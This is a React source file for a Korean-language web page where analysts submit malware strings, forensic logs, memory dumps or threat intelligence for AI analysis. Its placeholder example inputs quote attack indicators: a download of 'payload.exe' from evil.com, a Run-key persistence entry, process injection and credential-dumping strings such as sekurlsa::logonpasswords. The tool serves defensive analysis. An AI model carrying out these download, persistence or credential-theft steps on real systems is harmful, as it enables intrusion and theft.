import { useState, useRef, useEffect } from 'react'
import axios from 'axios'
import {
  FlaskConical, Bug, HardDrive, Cpu, Network,
  ChevronDown, ChevronUp, Send, Bot, User,
  AlertTriangle, Shield, Eye, Clock, Copy, CheckCheck, Cloud, Server, WifiOff,
} from 'lucide-react'
import GuidePanel from '../components/GuidePanel'
import FileUploadButton from '../components/FileUploadButton'
import CollectionGuide from '../components/CollectionGuide'

const MODE_BADGE = {
  cloud:   { icon: Cloud,        label: 'Claude Cloud로 분석됨', color: 'text-green-400',  bg: 'bg-green-500/10 border-green-500/30' },
  local:   { icon: Server,       label: '로컬 LLM으로 분석됨',    color: 'text-blue-400',   bg: 'bg-blue-500/10 border-blue-500/30' },
  offline: { icon: WifiOff,      label: '오프라인 규칙 기반으로 분석됨(폐쇄망)', color: 'text-amber-400', bg: 'bg-amber-500/10 border-amber-500/30' },
  mock:    { icon: FlaskConical, label: 'Mock 데모 데이터 (학습용, 실제 분석 아님)', color: 'text-slate-400', bg: 'bg-slate-500/10 border-slate-500/30' },
}

function ModeBanner({ result }) {
  if (!result?.mode) return null
  const cfg = MODE_BADGE[result.mode] ?? MODE_BADGE.offline
  const Icon = cfg.icon
  return (
    <div className={`border rounded-xl p-3 flex items-start gap-2 ${cfg.bg}`}>
      <Icon size={14} className={`${cfg.color} shrink-0 mt-0.5`} />
      <div>
        <p className={`text-xs font-semibold ${cfg.color}`}>{cfg.label}</p>
        {result.fallback_reason && (
          <p className="text-xs text-slate-400 mt-1">{result.fallback_reason}</p>
        )}
        {result.engine_note && (
          <p className="text-xs text-slate-400 mt-1">{result.engine_note}</p>
        )}
      </div>
    </div>
  )
}

const ANALYSIS_TYPES = [
  {
    id: 'malware',
    icon: Bug,
    label: '악성코드 분석',
    desc: '샘플 문자열·코드·행위 로그',
    color: 'red',
    placeholder: `분석할 내용을 입력하세요. 예시:
- strings 추출 결과
- 의심 코드 스니펫
- 행위 로그 (파일 생성·레지스트리·네트워크)
- 악성코드 해시 및 특성 정보

예시 입력:
CreateRemoteThread into explorer.exe
URLDownloadToFile http://evil.com/payload.exe
RegSetValue HKCU\\Run\\Update = C:\\temp\\svc.exe
Net connection: 185.220.101.47:443 ESTABLISHED`,
  },
  {
    id: 'forensics',
    icon: HardDrive,
    label: '포렌식 아티팩트',
    desc: '이벤트 로그·파일 목록·레지스트리',
    color: 'orange',
    placeholder: `포렌식 아티팩트를 입력하세요. 예시:
- Windows 이벤트 로그 (EventID + 내용)
- 파일 시스템 목록 및 타임스탬프
- 레지스트리 키 내보내기 결과
- 브라우저 히스토리·쿠키
- 프리패치 파일 목록

예시 입력:
EventID 4688 - Process Created: powershell.exe, Parent: winword.exe
File: C:\\Users\\user\\AppData\\Local\\Temp\\invoice.exe (Created: 2024-01-15 09:23)
Registry: HKCU\\Run\\WindowsUpdate = C:\\temp\\svc32.exe`,
  },
  {
    id: 'memory',
    icon: Cpu,
    label: '메모리 포렌식',
    desc: '프로세스 목록·메모리 문자열·네트워크',
    color: 'purple',
    placeholder: `메모리 아티팩트를 입력하세요. 예시:
- volatility pslist / pstree 결과
- netscan / netstat 결과
- 메모리에서 추출한 문자열
- DLL 목록 (dlllist)
- malfind 결과

예시 입력:
PID 4212  powershell.exe  PPID 3840 (winword.exe)
PID 5524  svchost.exe     PPID 4212 (powershell.exe)
TCP 192.168.1.10:54321 -> 185.220.101.47:443 ESTABLISHED (PID 5524)
String found: MiniDumpWriteDump, sekurlsa::logonpasswords`,
  },
  {
    id: 'threat_intel',
    icon: Network,
    label: '위협 인텔리전스',
    desc: 'IoC·TTP·공격 패턴 분석',
    color: 'violet',
    placeholder: `위협 인텔리전스 데이터를 입력하세요. 예시:
- 수집된 IoC (IP·도메인·해시)
- 관찰된 공격 행위 (TTP)
- 피해자 환경 및 공격 목적
- OSINT 수집 정보

예시 입력:
C2 도메인: update-service.net, cdn-delivery.net
공격 방법: MFA 피로 공격 → 헬프데스크 사회공학
대상: 클라우드 서비스 기업 IT 헬프데스크
목적: 도메인 관리자 권한 탈취 후 랜섬웨어 배포`,
  },
]

const THREAT_COLORS = {
  CRITICAL: 'border-red-500 bg-red-500/10 text-red-400',
  HIGH:     'border-orange-500 bg-orange-500/10 text-orange-400',
  MEDIUM:   'border-yellow-500 bg-yellow-500/10 text-yellow-400',
  LOW:      'border-blue-500 bg-blue-500/10 text-blue-400',
}

const TYPE_COLORS = {
  red:    { active: 'border-red-500 bg-red-500/10 text-red-300',    btn: 'bg-red-700 hover:bg-red-600',    dot: 'bg-red-500' },
  orange: { active: 'border-orange-500 bg-orange-500/10 text-orange-300', btn: 'bg-orange-700 hover:bg-orange-600', dot: 'bg-orange-500' },
  purple: { active: 'border-purple-500 bg-purple-500/10 text-purple-300', btn: 'bg-purple-700 hover:bg-purple-600', dot: 'bg-purple-500' },
  violet: { active: 'border-violet-500 bg-violet-500/10 text-violet-300', btn: 'bg-violet-700 hover:bg-violet-600', dot: 'bg-violet-500' },
}

const ACCENT_BY_COLOR = {
  red: 'text-red-300', orange: 'text-orange-300', purple: 'text-purple-300', violet: 'text-violet-300',
}

const TACTIC_COLORS = {
  'Initial Access':      'bg-red-500/20 text-red-300 border-red-500/30',
  'Execution':           'bg-orange-500/20 text-orange-300 border-orange-500/30',
  'Persistence':         'bg-yellow-500/20 text-yellow-300 border-yellow-500/30',
  'Privilege Escalation':'bg-amber-500/20 text-amber-300 border-amber-500/30',
  'Defense Evasion':     'bg-purple-500/20 text-purple-300 border-purple-500/30',
  'Credential Access':   'bg-pink-500/20 text-pink-300 border-pink-500/30',
  'Discovery':           'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
  'Lateral Movement':    'bg-blue-500/20 text-blue-300 border-blue-500/30',
  'Collection':          'bg-teal-500/20 text-teal-300 border-teal-500/30',
  'Command and Control': 'bg-violet-500/20 text-violet-300 border-violet-500/30',
  'Exfiltration':        'bg-amber-600/20 text-amber-300 border-amber-600/30',
  'Impact':              'bg-rose-500/20 text-rose-300 border-rose-500/30',
  'Resource Development':'bg-slate-500/20 text-slate-300 border-slate-500/30',
}

const SEV_COLORS = {
  CRITICAL: 'text-red-400', HIGH: 'text-orange-400', MEDIUM: 'text-yellow-400', LOW: 'text-blue-400',
}

const GUIDE_STEPS = [
  '왼쪽에서 분석 유형을 선택합니다: 악성코드·포렌식 아티팩트·메모리 포렌식·위협 인텔리전스.',
  '추가 컨텍스트(피해 시스템 환경, 조사 배경 등)를 선택적으로 입력합니다.',
  '분석할 데이터(strings 결과, 이벤트 로그, 프로세스 목록, IoC 등)를 입력 창에 붙여넣습니다.',
  '[AI 분석 실행] 버튼을 클릭하면 Claude AI가 심층 분석을 수행합니다.',
  '오른쪽에서 위협 레벨·MITRE ATT&CK 기법·IoC·타임라인 등 분석 결과를 확인합니다.',
  '하단 채팅창에 추가 질문을 입력해 AI에게 심층 분석을 요청할 수 있습니다.',
]
const GUIDE_TIPS = [
  '더 많은 데이터를 제공할수록 분석 정확도가 높아집니다.',
  '실제 환경 분석(Live 모드)에서는 사고 배경·피해 시스템 OS·네트워크 구성도 함께 입력하세요.',
  'MITRE ATT&CK 기법을 클릭하면 공식 문서(attack.mitre.org)에서 상세 정보를 확인할 수 있습니다.',
]

function ConfidenceBar({ value }) {
  const color = value >= 80 ? 'bg-green-500' : value >= 60 ? 'bg-yellow-500' : 'bg-orange-500'
  return (
    <div className="flex items-center gap-3">
      <div className="flex-1 h-2 bg-slate-700 rounded-full overflow-hidden">
        <div className={`h-full rounded-full transition-all duration-500 ${color}`} style={{ width: `${value}%` }} />
      </div>
      <span className="text-xs font-bold text-slate-300 w-8 text-right">{value}%</span>
    </div>
  )
}

function MitreBadge({ tech }) {
  const cls = TACTIC_COLORS[tech.tactic] ?? 'bg-slate-500/20 text-slate-300 border-slate-500/30'
  return (
    <a
      href={`https://attack.mitre.org/techniques/${tech.id.replace('.', '/')}`}
      target="_blank"
      rel="noopener noreferrer"
      className={`inline-flex flex-col gap-0.5 px-2.5 py-1.5 rounded-lg border text-xs transition-opacity hover:opacity-80 ${cls}`}
    >
      <span className="font-mono font-bold">{tech.id}</span>
      <span className="leading-tight">{tech.name}</span>
      <span className="text-[10px] opacity-70">{tech.tactic}</span>
    </a>
  )
}

function IocRow({ ioc }) {
  const [copied, setCopied] = useState(false)
  const copy = () => {
    navigator.clipboard.writeText(ioc.value)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }
  const typeColors = {
    domain: 'text-blue-400', ip: 'text-orange-400', url: 'text-violet-400',
    hash_md5: 'text-yellow-400', hash_sha256: 'text-yellow-400',
    file: 'text-red-400', registry: 'text-purple-400', mutex: 'text-pink-400',
  }
  return (
    <div className="flex items-start gap-2 py-2 border-b border-slate-700/50 last:border-0 group">
      <span className={`text-[10px] font-bold uppercase w-16 shrink-0 pt-0.5 ${typeColors[ioc.type] ?? 'text-slate-400'}`}>{ioc.type}</span>
      <span className="text-xs font-mono text-slate-200 break-all flex-1">{ioc.value}</span>
      <div className="flex items-start gap-1 shrink-0">
        <span className="text-[10px] text-slate-500 text-right leading-tight max-w-[120px]">{ioc.description}</span>
        <button onClick={copy} className="opacity-0 group-hover:opacity-100 transition-opacity p-0.5 hover:text-blue-400">
          {copied ? <CheckCheck size={12} className="text-green-400" /> : <Copy size={12} />}
        </button>
      </div>
    </div>
  )
}

function Section({ title, icon: Icon, children, defaultOpen = true }) {
  const [open, setOpen] = useState(defaultOpen)
  return (
    <div className="bg-slate-800 border border-slate-700 rounded-xl overflow-hidden">
      <button onClick={() => setOpen(o => !o)} className="w-full flex items-center gap-2 px-4 py-3 hover:bg-white/5 transition-colors">
        <Icon size={15} className="text-slate-400 shrink-0" />
        <span className="text-sm font-semibold flex-1 text-left">{title}</span>
        {open ? <ChevronUp size={14} className="text-slate-500" /> : <ChevronDown size={14} className="text-slate-500" />}
      </button>
      {open && <div className="px-4 pb-4 border-t border-slate-700/50 pt-3">{children}</div>}
    </div>
  )
}

function ChatBubble({ msg }) {
  const isUser = msg.role === 'user'
  return (
    <div className={`flex gap-2.5 ${isUser ? 'flex-row-reverse' : ''}`}>
      <div className={`w-7 h-7 rounded-full shrink-0 flex items-center justify-center ${isUser ? 'bg-blue-600' : 'bg-slate-600'}`}>
        {isUser ? <User size={13} /> : <Bot size={13} />}
      </div>
      <div className={`max-w-[80%] rounded-2xl px-4 py-2.5 text-xs leading-relaxed whitespace-pre-wrap ${
        isUser ? 'bg-blue-600 text-white rounded-tr-sm' : 'bg-slate-700 text-slate-200 rounded-tl-sm'
      }`}>
        {msg.content}
      </div>
    </div>
  )
}

function MalwareResult({ r }) {
  return (
    <div className="space-y-4">
      <Section title="악성 기능 (Capabilities)" icon={Bug}>
        <div className="flex flex-wrap gap-2">
          {r.capabilities?.map((c, i) => (
            <span key={i} className="text-xs bg-red-500/10 border border-red-500/30 text-red-300 px-2.5 py-1 rounded-lg">{c}</span>
          ))}
        </div>
      </Section>
      <Section title="침해 지표 (IoC)" icon={Eye}>
        <div>{r.iocs?.map((ioc, i) => <IocRow key={i} ioc={ioc} />)}</div>
      </Section>
      <Section title="행위 분석" icon={HardDrive}>
        {r.behavior && Object.entries(r.behavior).map(([k, v]) => (
          <div key={k} className="mb-2 last:mb-0">
            <span className="text-[10px] uppercase font-bold text-slate-500">{k}</span>
            <p className="text-xs text-slate-300 mt-0.5 leading-relaxed">{v}</p>
          </div>
        ))}
      </Section>
      <Section title="MITRE ATT&CK 기법" icon={Shield}>
        <div className="flex flex-wrap gap-2">{r.mitre_techniques?.map((t, i) => <MitreBadge key={i} tech={t} />)}</div>
      </Section>
    </div>
  )
}

function ForensicsResult({ r }) {
  return (
    <div className="space-y-4">
      <Section title="공격 타임라인" icon={Clock}>
        <div className="space-y-1.5">
          {r.timeline?.map((e, i) => (
            <div key={i} className="flex gap-3 items-start text-xs">
              <span className="font-mono text-slate-500 shrink-0 w-36">{e.time}</span>
              <span className={`shrink-0 font-bold w-14 ${SEV_COLORS[e.severity] ?? 'text-slate-400'}`}>{e.severity}</span>
              <span className="text-slate-300 leading-relaxed">{e.event}</span>
            </div>
          ))}
        </div>
      </Section>
      <Section title="주요 아티팩트" icon={HardDrive}>
        <div className="space-y-2">
          {r.artifacts?.map((a, i) => (
            <div key={i} className={`flex items-start gap-2 p-2.5 rounded-lg ${a.suspicious ? 'bg-red-500/5 border border-red-500/20' : 'bg-slate-700/30'}`}>
              <span className="text-[10px] font-bold uppercase text-slate-500 w-14 shrink-0 pt-0.5">{a.type}</span>
              <div className="flex-1 min-w-0">
                <p className="text-xs font-mono text-slate-200 break-all">{a.value}</p>
                <p className="text-[10px] text-slate-500 mt-0.5">{a.description}</p>
              </div>
              {a.suspicious && <span className="text-[9px] bg-red-500/20 text-red-400 px-1.5 py-0.5 rounded shrink-0">의심</span>}
            </div>
          ))}
        </div>
      </Section>
      <Section title="주요 발견 사항" icon={AlertTriangle}>
        <ul className="space-y-1.5">
          {r.findings?.map((f, i) => (
            <li key={i} className="flex gap-2 text-xs text-slate-300"><span className="text-orange-400 shrink-0">▸</span>{f}</li>
          ))}
        </ul>
      </Section>
    </div>
  )
}

function MemoryResult({ r }) {
  return (
    <div className="space-y-4">
      <Section title="의심 프로세스" icon={Cpu}>
        <div className="space-y-2">
          {r.suspicious_processes?.map((p, i) => (
            <div key={i} className={`p-3 rounded-lg border ${p.risk === 'CRITICAL' ? 'border-red-500/40 bg-red-500/5' : p.risk === 'HIGH' ? 'border-orange-500/40 bg-orange-500/5' : 'border-yellow-500/40 bg-yellow-500/5'}`}>
              <div className="flex items-center gap-2 mb-1">
                <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded ${THREAT_COLORS[p.risk] ?? ''}`}>{p.risk}</span>
                <span className="text-sm font-mono font-bold text-slate-200">{p.name}</span>
                <span className="text-xs text-slate-500">PID {p.pid}</span>
                <span className="text-xs text-slate-500 ml-auto">← {p.parent_name} ({p.parent_pid})</span>
              </div>
              <p className="text-xs text-slate-400">{p.issue}</p>
            </div>
          ))}
        </div>
      </Section>
      {r.injected_code?.length > 0 && (
        <Section title="코드 인젝션 탐지" icon={Bug}>
          <div className="space-y-2">
            {r.injected_code?.map((c, i) => (
              <div key={i} className="p-3 rounded-lg bg-red-500/5 border border-red-500/30">
                <div className="flex items-center gap-2 mb-1">
                  <span className="text-xs font-bold text-red-400">{c.technique}</span>
                  <span className="text-xs text-slate-500">→ {c.target_process}</span>
                  <span className="text-xs text-slate-600 ml-auto">{(c.size_bytes / 1024).toFixed(1)} KB</span>
                </div>
                <p className="text-xs text-slate-400">{c.description}</p>
              </div>
            ))}
          </div>
        </Section>
      )}
      <Section title="네트워크 연결" icon={Network}>
        <div className="space-y-1.5">
          {r.network_artifacts?.map((n, i) => (
            <div key={i} className={`flex items-center gap-2 p-2 rounded-lg text-xs font-mono ${n.suspicious ? 'bg-red-500/5 border border-red-500/20' : 'bg-slate-700/30'}`}>
              <span className="text-slate-400 text-[10px] w-6 text-center">{n.suspicious ? '⚠' : '•'}</span>
              <span className="text-slate-300">{n.local}</span>
              <span className="text-slate-600">→</span>
              <span className={n.suspicious ? 'text-red-300' : 'text-slate-300'}>{n.remote}</span>
              <span className="text-slate-600 text-[10px]">[{n.state}]</span>
              <span className="text-slate-500 ml-auto text-[10px]">{n.process}</span>
            </div>
          ))}
        </div>
      </Section>
      {r.strings_of_interest?.length > 0 && (
        <Section title="주목할 문자열" icon={Eye} defaultOpen={false}>
          <div className="space-y-1.5">
            {r.strings_of_interest?.map((s, i) => (
              <div key={i} className="flex gap-2 text-xs"><span className="text-purple-400 shrink-0">▸</span><span className="text-slate-300 font-mono break-all">{s}</span></div>
            ))}
          </div>
        </Section>
      )}
    </div>
  )
}

function ThreatIntelResult({ r }) {
  const actor = r.threat_actor ?? {}
  return (
    <div className="space-y-4">
      <Section title="위협 행위자 프로파일" icon={Network}>
        <div className="grid grid-cols-2 gap-2">
          {[
            ['그룹명', actor.name],
            ['별칭', actor.aliases?.join(', ')],
            ['출신/거점', actor.origin],
            ['동기', actor.motivation],
            ['활동 시기', actor.active_since],
            ['정교함', actor.sophistication],
          ].map(([label, value]) => value && (
            <div key={label} className="bg-slate-700/40 rounded-lg p-2.5">
              <p className="text-[10px] text-slate-500 uppercase font-bold">{label}</p>
              <p className="text-xs text-slate-200 mt-0.5">{value}</p>
            </div>
          ))}
        </div>
        {actor.targets && (
          <div className="mt-2">
            <p className="text-[10px] text-slate-500 uppercase font-bold mb-1.5">주요 타깃</p>
            <div className="flex flex-wrap gap-1.5">
              {actor.targets.map((t, i) => (
                <span key={i} className="text-xs bg-violet-500/10 border border-violet-500/30 text-violet-300 px-2 py-0.5 rounded">{t}</span>
              ))}
            </div>
          </div>
        )}
      </Section>
      <Section title="MITRE ATT&CK 기법" icon={Shield}>
        <div className="flex flex-wrap gap-2">{r.mitre_techniques?.map((t, i) => <MitreBadge key={i} tech={t} />)}</div>
      </Section>
      {r.similar_campaigns?.length > 0 && (
        <Section title="유사 캠페인" icon={Eye}>
          <div className="space-y-2">
            {r.similar_campaigns?.map((c, i) => (
              <div key={i} className="flex items-start gap-3 p-2.5 bg-slate-700/40 rounded-lg">
                <span className="text-sm font-bold text-violet-400 shrink-0">{c.overlap}</span>
                <div>
                  <p className="text-xs font-semibold text-slate-200">{c.name}</p>
                  <p className="text-[10px] text-slate-500 mt-0.5">{c.description}</p>
                </div>
              </div>
            ))}
          </div>
        </Section>
      )}
      <Section title="탐지 기회" icon={AlertTriangle}>
        <ul className="space-y-1.5">
          {r.detection_opportunities?.map((d, i) => (
            <li key={i} className="flex gap-2 text-xs text-slate-300"><span className="text-violet-400 shrink-0">▸</span>{d}</li>
          ))}
        </ul>
      </Section>
    </div>
  )
}

function ResultPanel({ result }) {
  const typeLabel = {
    malware: '악성코드 분석', forensics: '포렌식 아티팩트',
    memory: '메모리 포렌식', threat_intel: '위협 인텔리전스',
  }
  return (
    <div className="space-y-4">
      <ModeBanner result={result} />
      {/* Summary */}
      <div className="bg-slate-800 border border-slate-700 rounded-xl p-5 space-y-3">
        <div className="flex items-center gap-3 flex-wrap">
          <span className={`text-sm font-bold px-3 py-1 rounded-lg border ${THREAT_COLORS[result.threat_level] ?? ''}`}>
            {result.threat_level}
          </span>
          {result.malware_type && (
            <span className="text-sm text-slate-300 font-semibold">{result.malware_type}</span>
          )}
          <span className="text-xs text-slate-500 ml-auto">{typeLabel[result.analysis_type]}</span>
        </div>
        <p className="text-sm text-slate-200 leading-relaxed">{result.summary}</p>
        <div>
          <p className="text-[10px] text-slate-500 uppercase mb-1.5">분석 신뢰도</p>
          <ConfidenceBar value={result.confidence ?? 0} />
        </div>
      </div>

      {/* Type-specific panels */}
      {result.analysis_type === 'malware'      && <MalwareResult r={result} />}
      {result.analysis_type === 'forensics'    && <ForensicsResult r={result} />}
      {result.analysis_type === 'memory'       && <MemoryResult r={result} />}
      {result.analysis_type === 'threat_intel' && <ThreatIntelResult r={result} />}

      {/* Recommendations */}
      <Section title="대응 권고사항" icon={Shield}>
        <ol className="space-y-2">
          {result.recommendations?.map((rec, i) => (
            <li key={i} className="flex gap-2.5 text-xs text-slate-300">
              <span className="w-5 h-5 rounded-full bg-blue-500/20 text-blue-400 flex items-center justify-center text-[10px] font-bold shrink-0">{i + 1}</span>
              {rec}
            </li>
          ))}
        </ol>
      </Section>
    </div>
  )
}

export default function ThreatAnalysis() {
  const [analysisType, setAnalysisType] = useState('malware')
  const [context, setContext]           = useState('')
  const [inputData, setInputData]       = useState('')
  const [loading, setLoading]           = useState(false)
  const [result, setResult]             = useState(null)
  const [sessionId, setSessionId]       = useState(null)
  const [chatMsgs, setChatMsgs]         = useState([])
  const [chatInput, setChatInput]       = useState('')
  const [chatLoading, setChatLoading]   = useState(false)
  const [collectionGuide, setCollectionGuide] = useState(null)
  const chatEndRef = useRef(null)

  useEffect(() => {
    axios.get('/api/threat/guide').then(r => setCollectionGuide(r.data.collection_guide)).catch(() => {})
  }, [])

  useEffect(() => { chatEndRef.current?.scrollIntoView({ behavior: 'smooth' }) }, [chatMsgs])

  const currentType = ANALYSIS_TYPES.find(t => t.id === analysisType)
  const tc = TYPE_COLORS[currentType?.color] ?? TYPE_COLORS.red

  const runAnalysis = async (inputOverride) => {
    const body = inputOverride ?? inputData
    if (!body.trim()) return
    setLoading(true)
    setResult(null)
    setChatMsgs([])
    setSessionId(null)
    try {
      const res = await axios.post('/api/threat/analyze', {
        analysis_type: analysisType,
        input_data: body,
        context,
      })
      setResult(res.data)
      setSessionId(res.data.session_id)
    } catch (err) {
      alert('분석 실패: ' + (err.response?.data?.detail ?? err.message))
    } finally {
      setLoading(false)
    }
  }

  const sendChat = async () => {
    if (!chatInput.trim() || !sessionId) return
    const msg = chatInput.trim()
    setChatInput('')
    setChatMsgs(m => [...m, { role: 'user', content: msg }])
    setChatLoading(true)
    try {
      const res = await axios.post('/api/threat/chat', { session_id: sessionId, message: msg })
      setChatMsgs(m => [...m, { role: 'assistant', content: res.data.reply }])
    } catch {
      setChatMsgs(m => [...m, { role: 'assistant', content: '응답 실패. 다시 시도해 주세요.' }])
    } finally {
      setChatLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-slate-900 text-slate-100 p-6">
      <div className="max-w-7xl mx-auto space-y-6">

        <div>
          <h1 className="text-2xl font-bold flex items-center gap-2">
            <FlaskConical className="text-violet-400" size={26} /> 위협 분석 랩
          </h1>
          <p className="text-slate-400 text-sm mt-1">악성코드·포렌식·메모리·위협 인텔리전스를 AI로 심층 분석합니다.</p>
        </div>

        <GuidePanel title="위협 분석 랩 사용 가이드" steps={GUIDE_STEPS} tips={GUIDE_TIPS} />

        <div className="grid lg:grid-cols-5 gap-6">
          {/* Left: Input */}
          <div className="lg:col-span-2 space-y-5">

            {/* Analysis type */}
            <div>
              <p className="text-sm font-semibold text-slate-300 mb-2">분석 유형</p>
              <div className="grid grid-cols-2 gap-2">
                {ANALYSIS_TYPES.map(t => {
                  const c = TYPE_COLORS[t.color]
                  const isActive = analysisType === t.id
                  return (
                    <button
                      key={t.id}
                      onClick={() => { setAnalysisType(t.id); setResult(null); setChatMsgs([]) }}
                      className={`flex flex-col items-start p-3 rounded-xl border text-left transition-all ${
                        isActive ? c.active : 'border-slate-700 bg-slate-800 text-slate-400 hover:border-slate-500'
                      }`}
                    >
                      <t.icon size={18} className="mb-1" />
                      <span className="text-xs font-semibold">{t.label}</span>
                      <span className="text-[10px] text-slate-500 leading-tight mt-0.5">{t.desc}</span>
                    </button>
                  )
                })}
              </div>
            </div>

            <CollectionGuide
              items={collectionGuide?.[analysisType]?.items}
              usageNote={collectionGuide?.[analysisType]?.usage_note}
              accentColor={ACCENT_BY_COLOR[currentType?.color] ?? 'text-cyan-300'}
            />

            {/* Context */}
            <div>
              <p className="text-sm font-semibold text-slate-300 mb-1.5">
                조사 컨텍스트 <span className="text-slate-600 font-normal">(선택)</span>
              </p>
              <input
                value={context}
                onChange={e => setContext(e.target.value)}
                placeholder="예: Windows 10, 기업 내부망, 사고 발생 2024-01-15"
                className="w-full bg-slate-800 border border-slate-600 rounded-xl px-3 py-2.5 text-sm focus:outline-none focus:border-violet-500 placeholder-slate-600"
              />
            </div>

            {/* Sample data */}
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <p className="text-sm font-semibold text-slate-300">분석 데이터</p>
                <FileUploadButton onExtracted={(text) => { setInputData(text); runAnalysis(text) }} />
              </div>
              <textarea
                value={inputData}
                onChange={e => setInputData(e.target.value)}
                placeholder={currentType?.placeholder}
                rows={12}
                className="w-full bg-slate-800 border border-slate-600 rounded-xl p-4 text-sm font-mono resize-none focus:outline-none focus:border-violet-500 placeholder-slate-600"
              />
            </div>

            <button
              onClick={() => runAnalysis()}
              disabled={loading || !inputData.trim()}
              className={`w-full py-3 rounded-xl font-semibold transition-colors flex items-center justify-center gap-2 disabled:bg-slate-700 disabled:text-slate-500 ${tc.btn}`}
            >
              <FlaskConical size={16} />
              {loading ? 'AI 분석 중...' : 'AI 분석 실행'}
            </button>
          </div>

          {/* Right: Result + Chat */}
          <div className="lg:col-span-3 space-y-4">
            {!result && !loading && (
              <div className="bg-slate-800 border border-slate-700 rounded-xl p-12 text-center flex flex-col items-center gap-3">
                <FlaskConical size={44} className="text-slate-600" />
                <p className="text-sm text-slate-500">분석 유형을 선택하고 데이터를 입력한 후 분석을 실행하세요</p>
                <div className="flex gap-3 mt-2">
                  {ANALYSIS_TYPES.map(t => (
                    <div key={t.id} className="flex flex-col items-center gap-1 text-[10px] text-slate-600">
                      <t.icon size={18} />
                      {t.label}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {loading && (
              <div className="bg-slate-800 border border-slate-700 rounded-xl p-12 text-center flex flex-col items-center gap-3">
                <div className="w-10 h-10 border-2 border-violet-500 border-t-transparent rounded-full animate-spin" />
                <p className="text-sm text-slate-400">Claude AI가 심층 분석 중...</p>
                <p className="text-xs text-slate-600">MITRE ATT&CK 매핑 · IoC 추출 · 위협 프로파일링</p>
              </div>
            )}

            {result && (
              <>
                <div className="max-h-[680px] overflow-y-auto space-y-4 pr-1">
                  <ResultPanel result={result} />
                </div>

                {/* Chat */}
                <div className="bg-slate-800 border border-slate-700 rounded-xl overflow-hidden">
                  <div className="px-4 py-3 border-b border-slate-700 flex items-center gap-2">
                    <Bot size={15} className="text-violet-400" />
                    <span className="text-sm font-semibold">AI 분석가 채팅</span>
                    <span className="text-xs text-slate-500 ml-auto">추가 분석 요청</span>
                  </div>
                  <div className="h-48 overflow-y-auto p-4 space-y-3">
                    {chatMsgs.length === 0 && (
                      <p className="text-xs text-slate-500 text-center pt-4">
                        "이 악성코드 어떻게 탐지하나요?", "추가 포렌식 분석이 필요한 항목은?" 등 질문하세요.
                      </p>
                    )}
                    {chatMsgs.map((m, i) => <ChatBubble key={i} msg={m} />)}
                    {chatLoading && (
                      <div className="flex gap-2.5">
                        <div className="w-7 h-7 rounded-full bg-slate-600 flex items-center justify-center shrink-0"><Bot size={13} /></div>
                        <div className="bg-slate-700 rounded-2xl rounded-tl-sm px-4 py-2.5">
                          <div className="flex gap-1">
                            {[0, 1, 2].map(i => (
                              <div key={i} className="w-1.5 h-1.5 bg-slate-400 rounded-full animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />
                            ))}
                          </div>
                        </div>
                      </div>
                    )}
                    <div ref={chatEndRef} />
                  </div>
                  <div className="p-3 border-t border-slate-700 flex gap-2">
                    <input
                      value={chatInput}
                      onChange={e => setChatInput(e.target.value)}
                      onKeyDown={e => e.key === 'Enter' && !e.shiftKey && sendChat()}
                      placeholder="분석 결과에 대해 질문하세요..."
                      className="flex-1 bg-slate-700 border border-slate-600 rounded-lg px-3 py-2 text-sm focus:outline-none focus:border-violet-500"
                    />
                    <button
                      onClick={sendChat}
                      disabled={!chatInput.trim() || chatLoading}
                      className="p-2 bg-violet-600 hover:bg-violet-700 disabled:bg-slate-700 rounded-lg transition-colors"
                    >
                      <Send size={15} />
                    </button>
                  </div>
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
